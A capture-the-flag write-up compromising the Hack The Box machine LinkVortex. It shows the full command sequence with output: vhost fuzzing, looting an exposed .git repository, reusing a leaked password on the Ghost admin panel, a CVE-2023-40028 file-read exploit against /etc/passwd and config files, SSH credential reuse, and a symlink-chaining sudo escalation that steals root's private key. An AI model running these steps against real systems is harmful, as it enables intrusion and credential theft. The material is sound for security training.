# Target
| Category       | Details                                                      |
|----------------|--------------------------------------------------------------|
| 📝 Name        | [LinkVortex](https://app.hackthebox.com/machines/LinkVortex) |
| 🏷 Type        | HTB Machine                                                  |
| 🖥️ OS          | Linux                                                        |
| 🎯 Difficulty  | Easy                                                         |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ nmap -sS -sC $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 21:18 CEST
Nmap scan report for 10.129.22.221
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://linkvortex.htb/

Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
```

`nmap` detected `linkvortex.htb` virtual host. Which could be confirmed with `curl`.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ curl -I $TARGET
HTTP/1.1 301 Moved Permanently
Date: Fri, 11 Apr 2025 19:19:05 GMT
Server: Apache
Location: http://linkvortex.htb/
Content-Type: text/html; charset=iso-8859-1
```

Let's add it to `/etc/hosts` and re-scan.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ echo "$TARGET linkvortex.htb" | sudo tee -a /etc/hosts
10.129.22.221 linkvortex.htb
```
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ nmap -sS -sC -p80 linkvortex.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 21:20 CEST
Nmap scan report for linkvortex.htb (10.129.22.221)
Host is up (0.024s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-title: BitByBit Hardware

Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds
```

# Foothold
`nmap` show two (remote) services running on target, SSH and HTTP. We immediately can see that `http-generator` is `Ghost 5.58` and with quick [serach](https://www.google.com/search?q=Ghost+5.58) we already know that:
- Target is (most probably) using [Ghost CMS](https://ghost.org/).  
- Ghost 5.58 is vulnerable to [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028)

CVE-2023-40028 to be exploited requires admin panel access, thus we can not leverage it right away. Let's continue enumeration with both web browser and `ffuf`.

```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ ffuf -r -u http://linkvortex.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

With `ffuf` running in background we will use web browser to look around and gather some intel. Here are couple of things there we were able to find:
- This is some blog about PC hardware.
- It's named or being run by 'BitByBit Hardware'.
- There are 6 articles, all written by `admin` and those could be listed with http://linkvortex.htb/author/admin/.
- Ghost CMS has quite decent documentation:
  - Content API: https://ghost.org/docs/content-api/
  - Admin API: https://ghost.org/docs/admin-api/

In the meantime `ffuf` started to yield some results:
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

rss                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 642ms]
about                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 773ms]
feed                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 530ms]
About                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 796ms]
RSS                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 617ms]
private                 [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 616ms]
cpu                     [Status: 200, Size: 15472, Words: 2835, Lines: 277, Duration: 1244ms]
Rss                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 520ms]
ram                     [Status: 200, Size: 14746, Words: 2780, Lines: 277, Duration: 964ms]
ghost                   [Status: 200, Size: 3787, Words: 340, Lines: 65, Duration: 262ms]
psu                     [Status: 200, Size: 15163, Words: 2723, Lines: 279, Duration: 857ms]
Private                 [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 568ms]
Feed                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 873ms]
ABOUT                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 646ms]
```

One particualry entry is interesting, http://linkvortex.htb/ghost which leads us to admin panel 'Sign in' page. As we do not have any credentials yet, let's continue with enumeartion and scan for other virtual host with `ffuf`.

```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 36ms]
```

`ffuf` has discovered `dev` virtual host, let's add it to `/etc/hosts` and enumerate it.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ echo "$TARGET dev.linkvortex.htb" | sudo tee -a /etc/hosts
10.129.22.221 dev.linkvortex.htb
```

Web browser shows single page with information that website is under construction. Let's use `ffuf` once again.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ ffuf -r -u http://dev.linkvortex.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cgi-bin                 [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 32ms]
.git                    [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 37ms]
icons                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 28ms]
```

It seems that developers by mistake exposed `.git` directory! Let's exfiltrate it and use `git` locally to dig deeper.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ wget -q -r -np -R "index.html*" http://dev.linkvortex.htb/.git/ && \
cd dev.linkvortex.htb/ && \
ls -la .git/
total 740
drwxrwxr-x 7 magicrc magicrc   4096 Apr 11 21:27 .
drwxrwxr-x 3 magicrc magicrc   4096 Apr 11 21:27 ..
-rw-rw-r-- 1 magicrc magicrc    201 Dec  2 11:10 config
-rw-rw-r-- 1 magicrc magicrc     73 Dec  2 11:10 description
-rw-rw-r-- 1 magicrc magicrc     41 Dec  2 11:10 HEAD
drwxrwxr-x 2 magicrc magicrc   4096 Apr 11 21:27 hooks
-rw-rw-r-- 1 magicrc magicrc 707577 Dec  2 11:56 index
drwxrwxr-x 2 magicrc magicrc   4096 Apr 11 21:27 info
drwxrwxr-x 2 magicrc magicrc   4096 Apr 11 21:27 logs
drwxrwxr-x 5 magicrc magicrc   4096 Apr 11 21:27 objects
-rw-rw-r-- 1 magicrc magicrc    147 Dec  2 11:10 packed-refs
drwxrwxr-x 3 magicrc magicrc   4096 Apr 11 21:27 refs
-rw-rw-r-- 1 magicrc magicrc     82 Dec  2 11:10 shallow
```

With `.git` accessible locally, let's verify the internal consistency of Git objects.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ git fsck --full
Checking object directories: 100% (256/256), done.
Checking objects: 100% (6833/6833), done.
```

Reset files to their last committed state.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ git checkout .
Updated 5596 paths from the index
```

And see the differences between the last committed version and the files that have been staged for the next commit.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ git diff --staged
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = '******************';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```

`diff` shows changes in `Dockerfile.ghost` and `authentication.test.js`. In 2nd file we can see password change!
```
+            const password = '******************';
```

Let's note it down and sum up what we know so far:
- Admin panel is accessible at http://linkvortex.htb/ghost.
- [User authentication API](https://ghost.org/docs/admin-api/#user-authentication) uses `POST /admin/session/`
- There is `admin` user in the CMS.
- We found password with `git diff --staged`.

What we do not know is exact email for `admin` user, however we could assume that it would be in the same domain as target (`@linkvortex.htb`). So before we take any further action let's try those credentials.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ curl -v -X POST http://linkvortex.htb/ghost/api/admin/session -d '{"username":"admin@linkvortex.htb","password":"******************"}' -H 'Content-Type: application/json'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host linkvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.22.221
*   Trying 10.129.22.221:80...
* Connected to linkvortex.htb (10.129.22.221) port 80
* using HTTP/1.x
> POST /ghost/api/admin/session HTTP/1.1
> Host: linkvortex.htb
> User-Agent: curl/8.11.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 67
> 
* upload completely sent off: 67 bytes
< HTTP/1.1 201 Created
< Date: Fri, 11 Apr 2025 19:30:32 GMT
< Server: Apache
< X-Powered-By: Express
< Content-Version: v5.58
< Vary: Accept-Version,Accept-Encoding
< Cache-Control: no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0
< Content-Type: text/plain; charset=utf-8
< Content-Length: 7
< ETag: W/"7-rM9AyJuqT6iOan/xHh+AW+7K/T8"
< Set-Cookie: ghost-admin-api-session=s%3ArRG7_3Ujcgi01ztxzDafgx27xxQzt4lO.Kk7K0%2B3Z0monIqrxzIW8Kshu11tAoZAg8yeUfbVGZnQ; Path=/ghost; Expires=Sat, 11 Oct 2025 07:30:32 GMT; HttpOnly; SameSite=Lax
< 
* Connection #0 to host linkvortex.htb left intact
Created
```

We have gained access! So our (quite obvious) assumption worked, if however `admin` email address would be different, there two additional paths we could follow.
- [CVE-2024-43409](https://nvd.nist.gov/vuln/detail/CVE-2024-43409), with [PoC](https://blog.joshuastock.net/my-first-cve-uncovering-a-vulnerability-in-ghost), this however requires `comments` to be enabled, which is not our case.
- [CVE-2024-34451](https://nvd.nist.gov/vuln/detail/CVE-2024-34451), authentication rate-limit protection mechanism  could be bypassed by using `X-Forwarded-For` header with different values (e.g. random uuid with each request). This could be used to spray password we have found for `admin@$DOMAIN` (e.g. with use of `hydra`). 

Anyway, with access to admin panel let's exploit [CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028) to read local files on CMS system. We will use already existing exploit.

```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git CVE-2023-40028 && \
./CVE-2023-40028/CVE-2023-40028 -u admin@linkvortex.htb -p ****************** -h http://linkvortex.htb
Cloning into 'CVE-2023-40028'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 20 (delta 3), reused 9 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (20/20), 8.38 KiB | 8.38 MiB/s, done.
Resolving deltas: 100% (3/3), done.
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
Enter the file path to read (or type 'exit' to quit): exit
Exiting. Goodbye!
```

Access to `/etc/passwd` proves that exploit works. As we can not `ls` directories we need to know beforehand what files are looking for. There was one hint in previously obtained `git diff`, but let's run docker image of Ghost in 5.58 version and browse it files.

```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ docker run -d --name ghost-5.58 -e NODE_ENV=development ghost:5.58 && \
docker exec -it ghost-5.58 /bin/bash
5198ba79131fcf1cf1a71bcc64b747ff92ba0e693b4a0fd41cc498e04547a268
root@5198ba79131f:/var/lib/ghost# ls -l
total 20
lrwxrwxrwx  1 node node   22 Aug 10  2023 config.development.json -> config.production.json
-rw-r--r--  1 node node  295 Aug 10  2023 config.production.json
drwxrwxrwt 11 node node 4096 Apr 11 19:35 content
drwxr-xr-x 11 node node 4096 Aug 10  2023 content.orig
lrwxrwxrwx  1 node node   30 Aug 10  2023 current -> /var/lib/ghost/versions/5.58.0
drwxr-xr-x  1 node node 4096 Aug 10  2023 versions
root@5198ba79131f:/var/lib/ghost# 
```

First listing show that Ghost configuration file could be found in `/var/lib/ghost/config.production.json`. Let's see if we can access it.

```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ ./CVE-2023-40028/CVE-2023-40028 -u admin@linkvortex.htb -p ****************** -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "*********************"
        }
      }
    }
}
Enter the file path to read (or type 'exit' to quit): exit
Exiting. Goodbye!
```

We have found another credentials! It seems that they are used to configure SMTP server, let's check if `bob` is resuing those to access `linkvortex.htb` over SSH.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.129.22.221)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

Yes he is! We have gained foothoold, let's grab the user flag and proceed to elevation of privilages.
```
bob@linkvortex:~$ cat /home/bob/user.txt 
********************************
```

# Privileges escalation
Let's start with listing sudo privileges for `bob`.
```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

There is one entry, let's look for vulnerabilities in `/opt/ghost/clean_symlink.sh`.
```
bob@linkvortex:~$ cat -n /opt/ghost/clean_symlink.sh
     1  #!/bin/bash
     2
     3  QUAR_DIR="/var/quarantined"
     4
     5  if [ -z $CHECK_CONTENT ];then
     6    CHECK_CONTENT=false
     7  fi
     8
     9  LINK=$1
    10
    11  if ! [[ "$LINK" =~ \.png$ ]]; then
    12    /usr/bin/echo "! First argument must be a png file !"
    13    exit 2
    14  fi
    15
    16  if /usr/bin/sudo /usr/bin/test -L $LINK;then
    17    LINK_NAME=$(/usr/bin/basename $LINK)
    18    LINK_TARGET=$(/usr/bin/readlink $LINK)
    19    if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    20      /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    21      /usr/bin/unlink $LINK
    22    else
    23      /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    24      /usr/bin/mv $LINK $QUAR_DIR/
    25      if $CHECK_CONTENT;then
    26        /usr/bin/echo "Content:"
    27        /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    28      fi
    29    fi
    30  fi
```

This some kind of symlink clean up script, which accepts only `.png` files that are links. Those links can not target files contaning in it's path `etc` or `root`. Such links will be moved to `/var/quarantined` and if `CHECK_CONTENT` environment variable is set, content of link will be printed with `cat`. To grab `/etc/shadow` or `/root/.ssh/id_rsa` we would need to bypass those checks:
- 11 `if ! [[ "$LINK" =~ \.png$ ]]; then`
- 19 `if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then`
 
To do so, we could simply use indirect symlinks, e.g
```
/home/bob/id_rsa.png -> /home/bob/id_rsa.key -> /root/.ssh/id_rsa
```

```
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa /home/bob/id_rsa.key && \
ln -s /home/bob/id_rsa.key /home/bob/id_rsa.png && \
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/id_rsa.png
Link found [ /home/bob/id_rsa.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

We were able to steal `root` private key! Let's use it to gain `root` access over SSH and grab root flag and we're done here.
```
┌──(magicrc㉿perun)-[~/attack/HTB LinkVortex]
└─$ cat <<EOF> id_rsa && \
chmod 600 id_rsa && \
ssh root@linkvortex.htb -i id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
EOF
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# cat /root/root.txt 
********************************
```
